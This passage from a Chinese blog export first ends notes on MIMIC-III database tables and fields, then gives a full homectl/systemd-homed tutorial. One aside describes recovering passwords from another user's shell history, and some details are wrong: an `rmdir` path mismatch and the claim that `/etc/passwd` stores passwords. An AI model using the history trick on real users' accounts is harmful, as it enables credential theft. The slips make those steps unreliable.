<td>包含患者的基本信息（性别、出生日期、死亡日期、死亡标志位）</td>
<td></td>
</tr>
<tr class="odd">
<td>procedureevents_mv</td>
<td>包含患者的（治疗）程序</td>
<td></td>
</tr>
<tr class="even">
<td>procedures_icd</td>
<td>包含患者的ICD程序，最值得注意的是ICD-9程序，即诊断程序</td>
<td></td>
</tr>
<tr class="odd">
<td>services</td>
<td>患者被接纳/转移的服务</td>
<td></td>
</tr>
<tr class="even">
<td>transfers</td>
<td>患者整个住院期间的物理位置</td>
<td></td>
</tr>
</tbody>
</table>
<p>注意： 表格主要分为两种，一种是以D开头的，表示该表格为字典，比如d_labitems，表示实验室检查字典，内含每个实验室检查结果的说明；没有以D打头的表格则是记录患者信息的表格，比如labevents则表示患者住院期间的所有实验室检查结果。</p>
<h3 id="mimic数据表中主要字段">MIMIC数据表中主要字段</h3>
<table>
<thead>
<tr class="header">
<th>数据表</th>
<th>字段</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>ADMISSION</td>
<td>SUBJECT_ID</td>
<td>每个患者的唯一标识</td>
</tr>
<tr class="even">
<td>ADMISSION</td>
<td>HADM_ID</td>
<td>患者每次入院的唯一标识</td>
</tr>
<tr class="odd">
<td>ADMISSION</td>
<td>ADMITTIME</td>
<td>入院时间</td>
</tr>
<tr class="even">
<td>ADMISSION</td>
<td>DEATHTIME</td>
<td>死亡时间</td>
</tr>
<tr class="odd">
<td>DIAGNOSES_ICD</td>
<td>ICD9_CODES</td>
<td>患者的ICD-9编码</td>
</tr>
<tr class="even">
<td>ADMISSION</td>
<td>HOSPITAL_EXPIRE_FLAG</td>
<td>是否死亡</td>
</tr>
<tr class="odd">
<td>D_ITEMS</td>
<td>ITEMID</td>
<td>项目编号</td>
</tr>
<tr class="even">
<td>D_ITEMS</td>
<td>LEABEL</td>
<td>项目名称</td>
</tr>
<tr class="odd">
<td>ICUSTAYS</td>
<td>ICUSTAY_ID</td>
<td>每次ICU病房接受病人唯一标识</td>
</tr>
<tr class="even">
<td>LABEVENTS</td>
<td>VALUE</td>
<td>检查项目</td>
</tr>
<tr class="odd">
<td>LABEVENTS</td>
<td>VALUEUOM</td>
<td>ITEM的值 检查项目的单位（如K/uL）</td>
</tr>
<tr class="even">
<td>LABEVENT</td>
<td>FLAG</td>
<td>检查项目是否异常（正常为Null）</td>
</tr>
</tbody>
</table>
<h3 id="急性心肌梗死患者主要特征">急性心肌梗死患者主要特征</h3>
<table>
<thead>
<tr class="header">
<th>特征</th>
<th>字段或ITEMID</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>年龄</td>
<td>PTENETS.DOD和DOB</td>
</tr>
<tr class="even">
<td>性别</td>
<td>PATIENTS.GENDER</td>
</tr>
<tr class="odd">
<td>心率</td>
<td>CHARTEVENTS.ITEMID</td>
</tr>
<tr class="even">
<td>入院类型</td>
<td>ADMISSION_TYPE</td>
</tr>
<tr class="odd">
<td>ICD细分编码</td>
<td>ADMISSION.ICD9_CODE</td>
</tr>
<tr class="even">
<td>最小GCS评分</td>
<td>220739、223901、223900、198</td>
</tr>
<tr class="odd">
<td>排尿量</td>
<td>40055、226559</td>
</tr>
<tr class="even">
<td>PaO2</td>
<td>779、220224</td>
</tr>
<tr class="odd">
<td>白细胞计数WBC</td>
<td>220546、15424、200、1127、861</td>
</tr>
<tr class="even">
<td>体温</td>
<td>676、223762、678、223761</td>
</tr>
<tr class="odd">
<td>血钾浓度</td>
<td>50971</td>
</tr>
<tr class="even">
<td>血钠浓度</td>
<td>50983</td>
</tr>
<tr class="odd">
<td>血胆红素浓度</td>
<td>50885</td>
</tr>
<tr class="even">
<td>是否有血液恶性肿瘤</td>
<td>ICD9_CODE =200XX-208XX</td>
</tr>
<tr class="odd">
<td>收缩压</td>
<td>51、220050</td>
</tr>
<tr class="even">
<td>动脉收缩压</td>
<td>455、220179</td>
</tr>
<tr class="odd">
<td>血清尿素水平</td>
<td>51006</td>
</tr>
</tbody>
</table>
<h3 id="注意事项">注意事项</h3>
<ul>
<li>MIMIC IIII 数据库中用于识别患者身份的字段共有3个：subjects_id，hadm_id和icustay_id。其中subjects_id是患者身份的唯一标识，即一个subject_id只对应一名患者，一名患者也只有一个subject_id。hadm_id是患者每次住院的身份识别号，一个患者可能多次住院，因此一个subjects_id会对应多个hadm_id，但一个hadm_id只能对应一个subject_id。icustay_id表示患者在进入ICU的编号，因为患者一次住院可以多次进入不同的ICU，因此一个icustay_id只能对应一个hadm_id，当然也只能对应一个subject_id，但一个hadm_id可以对应多个icustay_id。在利用 MIMIC III 数据库进行研究时，往往需要运用sql语言对多个数据库进行连接，连接的基础一般就是这三个字段。</li>
<li>患者的临床资料不一定是住ICU期间的临床资料，也可能是住普通病房时的资料。记录患者入院时间的表格为admission，内含三个时间点：admittime，表示患者入院时间；dischartime，表示患者出院时间；deathtime，表示患者院内死亡的时间。如果deathtime为空(null)，则表示患者住院期间未死亡。记录患者进入和离开ICU的表格为icustays，这个表格中有两个时间较为重要，分别是intime和outtime，前者表示进入ICU的时间，后者表示离开ICU的时间。当然，如果患者在ICU死亡，那么dischartime、outtime和deathtime理论上就是同一个时间，但实际上会稍微有些出入，估计是由于录入不及时造成的；</li>
<li>MIMIC III 中的数据来自于两套数据采集系统：carevue和metavision。在icustays表格中，有一个字段叫dbsource，用于标识数据是来源于carevue还是metavision。CareVue记录的是2001至2008年入院的患者资料，Metavision则是2008至2012年期间入院的患者资料。在Metavision中，病人的随访时间最少为90天，在CareVue中，病人的随访时间则至少为4年。换而言之，在进行预后研究时，如果将数据来源限定为CareVue，则可以将随访时间假定为4年，对于4年以后死亡的患者，可以将其在出院后第4年生存状况定义为“存活”。当然，如果患者的死亡状况(DOD_SSN)为空格(null)，也同样可以表明患者在出院后4年仍然存活。</li>
<li>MIMIC数据库中的ICD编码统计方式和国内不太一样，基本都包含并发症，比如一个病人流感入院并死亡，同时患有急性心肌梗死的并发症，那么该病人也算作急性心肌梗死患者。（主要诊断是其他的疾病，但同时患有某疾病并发症，也认为是该疾病患者，统计死亡时也算在里面）</li>
<li>在MIMIC中有一个'ADMISSION_TYPE，其中有3个类别，分别是URGENT，EMERGENCY和ELECTIVE，ELECTIVE是不紧急的，URGENT和EMERGENCY的区别大概是URGENT的紧急程度更高（一般是需要立即采取措施的那种）</li>
</ul>
]]></content>
      <categories>
        <category>102网吧日常</category>
      </categories>
      <tags>
        <tag>MIMIC</tag>
      </tags>
  </entry>
  <entry>
    <title>systemd-homed简介和homectl设置用户、用户组</title>
    <url>/systemd-homed/</url>
    <content><![CDATA[<p>在2020.3 发布的systemd 245增加了systemd-homed，改变了<code>/home</code>目录的加密和工作方式，采用homectl这个cli工具设置用户组。快来当小白鼠吧。 <a id="more"></a></p>
<h2 id="太长不看版">太长不看版</h2>
<h3 id="使用homectl新建用户用户组">使用homectl新建用户、用户组</h3>
<p>首先你的systemd要在245以后，版本较低或使用SysV或者OpenRC、Upstart的玩家请跳过。</p>
<p>homectl是systemd-homed.service的一个cli工具，用来配置用户组、用户，包括新建、删除、修改权限和密码等。考虑到systemd近乎一统江湖的的市场占有率，可能你们将不得不面对这种方式。</p>
<p>没开启的先开启一下<code>systemd-homed.service</code></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl <span class="token builtin class-name">enable</span> systemd-homed
systemctl start systemd-homed<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>如果你的daemon没启动可能会出现<code>**Operation on home test1 failed: Failed to execute operation: Resource temporarily unavailable**</code></p>
<p>看到下面这样就行了</p>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">Created symlink &#x2F;etc&#x2F;systemd&#x2F;system&#x2F;dbus-org.freedesktop.home1.service → &#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;systemd-homed.service.
Created symlink &#x2F;etc&#x2F;systemd&#x2F;system&#x2F;multi-user.target.wants&#x2F;systemd-homed.service → &#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;systemd-homed.service.
Created symlink &#x2F;etc&#x2F;systemd&#x2F;system&#x2F;sockets.target.wants&#x2F;systemd-userdbd.socket → &#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;systemd-userdbd.socket.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>新建用户</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">homectl create zhixi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>会像下面这样提示你输入密码，输完之后要稍等一会</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@zjk-allseries zjk<span class="token punctuation">]</span><span class="token comment"># homectl create zhixi</span>
🔐 Please enter new password <span class="token keyword">for</span> user zhixi: ******                  
🔐 Please enter new password <span class="token keyword">for</span> user zhixi <span class="token punctuation">(</span>repeat<span class="token punctuation">)</span>: <span class="token punctuation">(</span>press TAB <span class="token keyword">for</span> no <span class="token builtin class-name">echo</span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>创建成功之后使用<code>homectl list</code>查看homectl创建的用户是否存在</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@zjk-allseries zjk<span class="token punctuation">]</span><span class="token comment"># homectl list</span>
NAME  <span class="token environment constant">UID</span>   GID   STATE    REALNAME <span class="token environment constant">HOME</span>        <span class="token environment constant">SHELL</span>    
<span class="token builtin class-name">test</span>  <span class="token number">60444</span> <span class="token number">60444</span> inactive <span class="token builtin class-name">test</span>     /home/test  /bin/bash
test1 <span class="token number">60510</span> <span class="token number">60510</span> inactive test1    /home/test1 /bin/bash
zhixi <span class="token number">60353</span> <span class="token number">60353</span> inactive zhixi    /home/zhixi /bin/bash

<span class="token number">3</span> home areas listed.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>homectl inspect username</code>可以查看用户信息</p>
<pre class="line-numbers language-none"><code class="language-none">[root@zjk-allseries zhixi]# homectl inspect zhixi
   User name: zhixi
       State: active
 Disposition: regular
 Last Change: Sat 2020-10-31 17:05:25 CST
    Login OK: yes
 Password OK: yes
         UID: 60353
         GID: 60353 (zhixi)
   Directory: &#x2F;home&#x2F;zhixi
     Storage: luks (strong encryption)
  Image Path: &#x2F;home&#x2F;zhixi.home
   Removable: no
       Shell: &#x2F;bin&#x2F;bash
LUKS Discard: online&#x3D;no offline&#x3D;yes
   LUKS UUID: 107ff22e399d417d92f398c91275de3b
   Part UUID: 645499ec3e554eaca0f09a9b172d89b3
     FS UUID: a6b5969ecfee4ae49f0cad9931f31589
 File System: ext4
 LUKS Cipher: aes
 Cipher Mode: xts-plain64
  Volume Key: 256bit
 Mount Flags: nosuid nodev exec
   Disk Size: 654.0G
  Disk Usage: 11.3G (&#x3D; 1.8%)
   Disk Free: 642.7G (&#x3D; 98.2%)
  Disk Floor: 11.3G
Disk Ceiling: 769.5G
  Good Auth.: 1
   Last Good: Sat 2020-10-31 19:23:25 CST
   Bad Auth.: 1
    Last Bad: Sat 2020-10-31 19:23:17 CST
    Next Try: anytime
 Auth. Limit: 30 attempts per 1min
   Passwords: 1
  Local Sig.: yes
     Service: io.systemd.Home
lines 2-36&#x2F;36 (END)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>然后激活用户</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">homectl activate zhixi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>退出当前用户并切换用户就可以了(你可能需要更改PAM设置才能正常使用su切换用户)</p>
<h3 id="从原来的用户组管理方式迁往systemd-home">从原来的用户组管理方式迁往systemd-home</h3>
<blockquote>
<p>这里直接复读一下systemd官网的警告，需要手动操作、有风险、做好备份、出了事自行承担</p>
</blockquote>
<p>(不喜欢折腾的人不推荐这么干，原来的又不是不能用了</p>
<p>其实建议你直接去看<span class="exturl" data-url="aHR0cHM6Ly9zeXN0ZW1kLmlvL0NPTlZFUlRJTkdfVE9fSE9NRUQv">官网的英文说明<i class="fa fa-external-link-alt"></i></span>，这个是给不想看官方文档的懒狗准备的（不会吧不会吧，不会真有这种懒狗吧）</p>
<p>切到root操作，先重命名你的用户目录，随便移到一个空间够的位置</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mv</span> /home/zhixi /home/zhixi.saved<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>然后看一下你的用户设置（假设用户名是zhixi,GID=1000），以及所在的用户组设置（1000改成你的GID）</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">getent <span class="token function">passwd</span> zhixi
getent shadow zhixi
getent group <span class="token number">1000</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>（上面是官方文档的做法，也可以用<code>lslogin -u</code>查看）</p>
<p>把上面这些也备份一下。然后把<code>/etc/passwd</code>和<code>/etc/shadow</code>和<code>/etc/group</code>还有<code>/etc/gshadow</code>里面的zhixi用户相关的东西删了（基本上就只有一行）。</p>
<p>（官方文档说为了安全请使用<code>vipw</code>, <code>vipw -s</code>, <code>vigr</code> and <code>vigr -s</code>，这些是给配置文件加锁，防止多人同时更改出现问题，使用跟vim一样（找到那一行按dd然后ESC, :,wq回车就好了），如果你确定是自己一个人操作（也没有别人远程登陆或者其他程序正在修改），似乎用别的什么文本编辑器也没什么问题）</p>
<p>（其实，你可以直接用<code>userdel</code>删除）</p>
<p>然后剩下的操作跟第一节一样，用<code>homectl</code>新建一个就好了</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">homectl create zhixi --uid<span class="token operator">=</span><span class="token number">1000</span> --real-name<span class="token operator">=</span>zjk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>(uid填你的uid，real-name后面填你的GECOS)</p>
<p>可能你还想改改磁盘加密方式什么的，想设置的都先设置好。</p>
<p>然后rsync把原来备份了的东西放回<code>/home/zhixi</code></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">homectl with zhixi -- <span class="token function">rsync</span> -aHAXv --remove-source-files /home/zhixi.saved/ <span class="token builtin class-name">.</span> <span class="token operator">&amp;&amp;</span>  <span class="token function">rmdir</span> /home/foobar.saved<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="注意">注意</h3>
<p>systemd-home是一个用户一个私有用户组。如果你一个用户组设置了多个用户的话，可能要调整一下。</p>
<h2 id="systemd-home简介">systemd-home简介</h2>
<p><del>感觉这下子systemd接管的东西更多了</del></p>
<h3 id="以前的用户和用户组管理">以前的用户和用户组管理</h3>
<p>好吧，以前要加引号，现在这个在大部分Linux都还没人用呢（甚至连一篇中文介绍都没有）。</p>
<p>通常使用<code>useradd</code>或<code>adduser</code>新建用户（不同发行版这两条命令有一点区别），比如</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">useradd</span> -U temp
<span class="token function">sudo</span> <span class="token function">useradd</span> temp1 -m -G temp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>新建一个temp用户组并给temp用户组中新建一个叫temp1的用户（同时在<code>/home</code>下新建一个<code>temp1</code>目录作为用户目录）。</p>
<p>然后使用<code>passwd temp1</code>为用户temp1指定密码</p>
<p>（虽然useradd有<code>-p</code>选项可以直接指定密码，通常不建议这样做，因为这样子恁的密码会明文留在历史命令里，如果有人不怀好意的执行一下<code>history</code>或者<code>more /home/$USER/.bash_history</code>或者<code>ctrl+r</code>搜索useradd，他将轻易获取你的密码），你用了sudo也可能会被找到，比如<span class="exturl" data-url="aHR0cHM6Ly9zdXBlcnVzZXIuY29tL3F1ZXN0aW9ucy8zMDk0MzQvaG93LXRvLXZpZXctY29tbWFuZC1oaXN0b3J5LW9mLWFub3RoZXItdXNlci1pbi1saW51eA==">这个<i class="fa fa-external-link-alt"></i></span></p>
<p>https://www.freebuf.com/news/135845.html history -c 也不太保险</p>
<p>你的用户名、密码、用户组、权限配置基本都放在<code>/etc</code>目录下面，比如<code>/etc/passwd</code>里面存你的密码，<code>etc/group</code>里面放用户组的设置。<code>/etc/sudoers</code>是超级用户的设置。每个用户的配置散落在各个地方，一些个人设置还被放在了<code>/home/user</code>底下。</p>
<p>这个样子你需要<code>/etc</code>的写权限，一个用户不同系统迁移的时候需要同时迁移其他的目录（而且UID还得一样），想对<code>/home</code>单独加密也不太方便。</p>
<h3 id="变化">变化</h3>
<p>主要的变化就是你的个人用户都扔到<code>/home/yourusername</code>下面了。（据说）这样更方便加密和迁移。默认采用LUKS，在用户登陆的时候解密并挂载<code>/home/user</code>，在用户退出登陆的时候加密并取消挂载。休眠挂起（Suspend）的时候也会加密锁住。</p>
<p>比如你有一个u盘，里面装了你的用户目录，到别的电脑上插上去就能用了，不需要那边给你新建一个用户（现在基本不太行，对面电脑起码得也是systemd 245 版本以上还得启用<code>systemd-home</code>，我乐观估计等这玩意普及至少得两年吧，那些用老CentOS的万年钉子户更别想了）</p>
<p>这样也方便全盘加密（我不是那种对物理安全都看的很在乎的申必人士，据说全盘加密会有点性能问题，而且休眠睡眠也比较容易起不来，所以我没试过）（不过恁不用这个systemd-home其实也能全盘加密）</p>
<p>现在使用<code>systemd-homed.service</code>和<code>systemd-userdbd.service</code>两个daemon管理用户，登陆的时候是<code>systemd-logind</code> 在管。大概是这么个流程：</p>
<p><img src="/systemd-homed/image-20201108172857040.png" /></p>
<p><img src="/systemd-homed/image-20201108172321494.png" /></p>
<p>另外，Yubikeys现在是一等公民（说的好像这小玩意这么贵我买得起一样） Yubikeys或者别的加密设备我手头没有，而且LUKS加密home目录之类的我也没有那么高的安全需求，哪位好心人要是愿意送/借我一个玩玩，我把这部分内容补上</p>
<h3 id="现在的样子">现在的样子</h3>
<p>使用<code>homectl activate</code>激活用户目录后你会看到在<code>/home</code>目录下多了一个用户目录</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ homectl activate zhixi
🔐 Please enter password <span class="token keyword">for</span> user zhixi: ****** <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>原来<code>/home</code>下只有一个zhixi.home，activate之后多了一个zhixi目录</p>
<p>我们看一下这个目录下面有什么</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">cd</span> /home/zhixi <span class="token operator">&amp;&amp;</span> <span class="token function">ls</span> -a
<span class="token builtin class-name">.</span>  <span class="token punctuation">..</span>  .bash_logout  .bash_profile  .bashrc  .identity<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>其中的<code>.identity</code>存放你的密码等登陆认证信息（以json存储用户记录（JSON User Recoed））,大概长这样</p>
<figure>
<img src="/systemd-homed/image-20201108170804174.png" alt="image-20201108170804174" /><figcaption aria-hidden="true">image-20201108170804174</figcaption>
</figure>
<p><code>homectl inspect username</code>可以查看用户信息</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ homectl inspect zhixi
   User name: zhixi
       State: active
 Disposition: regular
 Last Change: Sat <span class="token number">2020</span>-10-31 <span class="token number">17</span>:05:25 CST
    Login OK: <span class="token function">yes</span>
 Password OK: <span class="token function">yes</span>
         <span class="token environment constant">UID</span><span class="token builtin class-name">:</span> <span class="token number">60353</span>
         GID: <span class="token number">60353</span> <span class="token punctuation">(</span>zhixi<span class="token punctuation">)</span>
   Directory: /home/zhixi
     Storage: luks <span class="token punctuation">(</span>strong encryption<span class="token punctuation">)</span>
  Image Path: /home/zhixi.home
   Removable: no
       Shell: /bin/bash
LUKS Discard: <span class="token assign-left variable">online</span><span class="token operator">=</span>no <span class="token assign-left variable">offline</span><span class="token operator">=</span>yes
   LUKS UUID: 107ff22e399d417d92f398c91275de3b
   Part UUID: 645499ec3e554eaca0f09a9b172d89b3
     FS UUID: a6b5969ecfee4ae49f0cad9931f31589
 File System: ext4
 LUKS Cipher: aes
 Cipher Mode: xts-plain64
  Volume Key: 256bit
 Mount Flags: nosuid nodev <span class="token builtin class-name">exec</span>
   Disk Size: <span class="token number">654</span>.0G
  Disk Usage: <span class="token number">11</span>.3G <span class="token punctuation">(</span><span class="token operator">=</span> <span class="token number">1.8</span>%<span class="token punctuation">)</span>
   Disk Free: <span class="token number">642</span>.7G <span class="token punctuation">(</span><span class="token operator">=</span> <span class="token number">98.2</span>%<span class="token punctuation">)</span>
  Disk Floor: <span class="token number">11</span>.3G
Disk Ceiling: <span class="token number">769</span>.5G
  Good Auth.: <span class="token number">1</span>
   Last Good: Sat <span class="token number">2020</span>-10-31 <span class="token number">19</span>:23:25 CST
   Bad Auth.: <span class="token number">1</span>
    Last Bad: Sat <span class="token number">2020</span>-10-31 <span class="token number">19</span>:23:17 CST
    Next Try: anytime
 Auth. Limit: <span class="token number">30</span> attempts per 1min
   Passwords: <span class="token number">1</span>
  Local Sig.: <span class="token function">yes</span>
     Service: io.systemd.Home
lines <span class="token number">2</span>-36/36 <span class="token punctuation">(</span>END<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="存在的一些问题">存在的一些问题</h3>
<p>这个东西主要是focus on <code>particularly Laptop users</code>，目前可能多多少少有点小问题。企业用途和运维貌似也不怎么需要这个。</p>
<h4 id="ssh的问题">SSH的问题</h4>
<p>这个东西直接把/home全都加密了，当然也包括<code>.ssh</code>目录下面的东西。</p>
<p>目前看来没有什么很完美的办法，有人是这样干的：先整一个其他的空用户在他的/home/user下面存公钥，用密码登陆，然后su切过去。(反正看起来挺扭曲的)</p>
<p>不过对于笔记本个人用户来说SSH到自己的加密盘貌似不是什么刚需，还是等完善了随身带着硬盘走比较好。</p>
<h4 id="休眠">休眠</h4>
<p>貌似不少人会碰到奇奇怪怪的休眠问题，很在意休眠的笔记本用户请谨慎上车。</p>
<h2 id="可能的报错">可能的报错</h2>
<pre class="line-numbers language-none"><code class="language-none">homectl su: Authentication service cannot retrieve authentication info<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>可能是你的daemon没启动，试试启动daemon并重启一下试试。</p>
<pre class="line-numbers language-none"><code class="language-none">Operation on home me failed: Specified user name me conflicts with an NSS group by the same name, refusing.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>用户组冲突了，看看你之前是不是用useradd之类的操作新建过同名用户组。</p>
<pre class="line-numbers language-none"><code class="language-none">su: Authentication service cannot retrieve authentication info<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这个报错出现在我换到systemd-homed后试图用su切换用户。一开始我用 su 在桌面环境下切用户就没成功过，退出登陆后跑到SDDM里是可以的，本来以为这是个feature。后来觉得不应该啊，一查果然，要手动改PAM设置，在<code>/etc/pam.d</code>里面改一下su的配置就好了。配置照着模板改就好了，<code>man pam_systemd_home</code>，详情参考<span class="exturl" data-url="aHR0cHM6Ly93d3cuZnJlZWRlc2t0b3Aub3JnL3NvZnR3YXJlL3N5c3RlbWQvbWFuL3BhbV9zeXN0ZW1kX2hvbWUuaHRtbA==">pam_systemd_home<i class="fa fa-external-link-alt"></i></span>，arch用户看<span class="exturl" data-url="aHR0cHM6Ly9qbGsuZmpmaS5jdnV0LmN6L2FyY2gvbWFucGFnZXMvbWFuL3BhbV9zeXN0ZW1kX2hvbWUuOA==">这里<i class="fa fa-external-link-alt"></i></span></p>
<figure>
<img src="/systemd-homed/image-20201108142022596.png" alt="PAM模板例子" /><figcaption aria-hidden="true">PAM模板例子</figcaption>
</figure>
<p>而且看起来很多时候有root权限它还是会让你输入当前用户的密码，比如<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3N5c3RlbWQvc3lzdGVtZC9pc3N1ZXMvMTYxNjY=">这个issue<i class="fa fa-external-link-alt"></i></span></p>
<pre class="line-numbers language-none"><code class="language-none">Operation on home username failed: Access denied<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>权限不够，你至少需要root权限或者要切换到的那个用户的密码才能操作对应目录或者修改配置。（貌似homectl的很多操作需要输入）</p>
<pre class="line-numbers language-none"><code class="language-none">Operation on home username failed: Failed to execute operation: File exists<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这个错误的原因可能有很多，或许可以试试<code>systemctl restart systemd-homed</code></p>
<pre class="line-numbers language-none"><code class="language-none">(Unknown (FileSystemError): Error: ENOSPC: no space left on device, write)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>我新建第二个的时候没有指定存储空间，直接塞满了。用<code>homectl resize user 10G</code>调整了磁盘分配后解决。</p>
<h2 id="附">附</h2>
<p>给不愿意<code>--help</code>看英文说明的懒狗翻译一下命令选项</p>
<h3 id="homectl命令选项">homectl命令选项</h3>
<table>
<colgroup>
<col style="width: 12%" />
<col style="width: 28%" />
<col style="width: 36%" />
<col style="width: 20%" />
<col style="width: 2%" />
</colgroup>
<thead>
<tr class="header">
<th>homectl</th>
<th>Explinations</th>
<th>作用</th>
<th>例子</th>
<th></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>list</td>
<td>List home areas</td>
<td>列出用户信息（包括NAME UID GID STATE REALNAME HOME SHELL）</td>
<td>homectl list</td>
<td></td>
</tr>
<tr class="even">
<td>activate USER…</td>
<td>Activate a home area</td>
<td>激活用户（执行后<code>/home</code>下面会多出一个和用户同名的目录）</td>
<td>homectl activate zhixi</td>
<td></td>
</tr>
<tr class="odd">
<td>deactivate USER…</td>
<td>Deactivate a home area</td>
<td>取消激活</td>
<td>homectl deactivate zhixi</td>
<td></td>
</tr>
<tr class="even">
<td>inspect USER…</td>
<td>Inspect a home area</td>
<td>查看用户信息，跟userdbctl user... 的输出差不多</td>
<td>homectl inspect zhixi</td>
<td></td>
</tr>
<tr class="odd">
<td>authenticate USER…</td>
<td>Authenticate a home area</td>
<td>验证用户</td>
<td>homectl authenticate zhixi</td>
<td></td>
</tr>
<tr class="even">
<td>create USER</td>
<td>Create a home area</td>
<td>新建用户</td>
<td>homectl create zhixi</td>
<td></td>
</tr>
<tr class="odd">
<td>remove USER…</td>
<td>Remove a home area</td>
<td>移除用户</td>
<td>homectl remove zhixi</td>
<td></td>
</tr>
<tr class="even">
<td>update USER</td>
<td>Update a home area</td>
<td>更改用户设置和状态</td>
<td>homectl update me --locked=false</td>
<td></td>
</tr>
<tr class="odd">
<td>passwd USER</td>
<td>Change password of a home area</td>
<td>改密码</td>
<td>homectl passwd zhixi</td>
<td></td>
</tr>
<tr class="even">
<td>with USER [COMMAND…]</td>
<td>Run shell or command with access to a home area</td>
<td>用到/在某个用户目录下执行命令（需要root或该用户密码）</td>
<td>homectl with zhixi -- mkdir test1</td>
<td></td>
</tr>
<tr class="odd">
<td>resize USER SIZE</td>
<td>Resize a home area</td>
<td>调整用户的存储空间</td>
<td>homectl resize zhixi 30G</td>
<td></td>
</tr>
<tr class="even">
<td>lock USER...</td>
<td>Temporarily lock an active home area</td>
<td>锁定用户</td>
<td>homectl lock zhixi</td>
<td></td>
</tr>
<tr class="odd">
<td>unlock USER</td>
<td>Unlock a temporarily locked home area</td>
<td>解锁用户</td>
<td>homectl unlock zhixi</td>
<td></td>
</tr>
</tbody>
</table>
<h3 id="userdbctl命令选项">userdbctl命令选项</h3>
<table>
<colgroup>
<col style="width: 19%" />
<col style="width: 41%" />
<col style="width: 13%" />
<col style="width: 25%" />
</colgroup>
<thead>
<tr class="header">
<th>userdbctl</th>
<th>Explinations</th>
<th>作用</th>
<th>例子</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>user [USER…]</td>
<td>Inspect user</td>
<td>查看用户信息</td>
<td>userdbctl user zhixi</td>
</tr>
<tr class="even">
<td>group [GROUP…]</td>
<td>Inspect group</td>
<td>查看用户组信息</td>
<td>userdbctl group zhixi</td>
</tr>
<tr class="odd">
<td>users-in-group [GROUP…]</td>
<td>Show users that are members of specified group(s)</td>
<td>查看组中用户</td>
<td>userdbctl users-in-group zhixi</td>
</tr>
<tr class="even">
<td>groups-of-user [USER…]</td>
<td>Show groups the specified user(s) is a member of</td>
<td>查看用户所在的组</td>
<td>userdbctl groups-of-user zhixi</td>
</tr>
</tbody>
</table>
<h2 id="参考">参考</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly9zeXN0ZW1kLmlvL0hPTUVfRElSRUNUT1JZLw==">https://systemd.io/HOME_DIRECTORY/<i class="fa fa-external-link-alt"></i></span> 官方文档</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cubWFuNy5vcmcvbGludXgvbWFuLXBhZ2VzL21hbjEvaG9tZWN0bC4xLmh0bWw=">https://www.man7.org/linux/man-pages/man1/homectl.1.html<i class="fa fa-external-link-alt"></i></span> https://www.freedesktop.org/software/systemd/man/homectl.html</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9sd24ubmV0L0FydGljbGVzLzgxNDA2OC8=">systemd 245 released<i class="fa fa-external-link-alt"></i></span> systemd第245次更新详情</p>
